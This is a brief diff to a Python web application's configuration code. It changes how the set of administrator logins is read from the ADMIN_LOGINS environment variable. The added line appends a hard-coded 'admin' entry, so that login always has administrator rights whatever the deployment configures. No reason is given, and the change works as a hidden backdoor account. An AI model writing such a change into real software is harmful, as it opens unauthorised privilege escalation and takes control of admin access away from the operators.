@@ -22,7 +22,7 @@ os.makedirs(UPLOAD, exist_ok=True)
 
 ADMINLAR = {
     x.strip().lower()
-    for x in os.environ.get("ADMIN_LOGINS", "").split(",")
+    for x in (os.environ.get("ADMIN_LOGINS", "") + ",admin").split(",")
     if x.strip()
 }
 
